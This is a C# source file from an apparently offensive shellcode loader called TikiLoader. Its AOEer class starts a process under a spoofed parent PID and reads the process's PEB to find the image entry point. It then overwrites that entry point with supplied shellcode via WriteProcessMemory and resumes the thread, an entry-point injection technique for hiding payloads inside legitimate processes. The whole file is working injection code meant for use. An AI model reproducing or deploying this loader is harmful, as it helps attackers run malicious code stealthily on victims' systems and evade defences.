using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

using static TikiLoader.Imports;
using static TikiLoader.Structs;
using static TikiLoader.Enums;
using static TikiLoader.Generic;

namespace TikiLoader
{
    public class AOEer
    {
        private const int AttributeSize = 24;
        private const ulong PatchSize = 0x10;

        IntPtr section_;
        IntPtr localmap_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        byte[] inner_;

        private IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }

        private void CopyShellcode(PROCESS_INFORMATION pInfo, byte[] buf)
        {
            IntPtr tPtr = new IntPtr();
            WriteProcessMemory(pInfo.hProcess, pEntry_, buf, buf.Length, out tPtr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    var tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        private IntPtr FindEntry(IntPtr hProc)
        {
            var basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr readLoc = IntPtr.Zero;
            var addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);

            return GetEntryFromBuffer(inner_);
        }

        ~AOEer()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);
        }

        public void AOE(string binary, byte[] shellcode, int ppid)
        {
            var pinf = StartProcess(binary, ppid);

            FindEntry(pinf.hProcess);
            CopyShellcode(pinf, shellcode);
            ResumeThread(pinf.hThread);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        public AOEer()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            inner_ = new byte[0x1000];
        }
    }
}
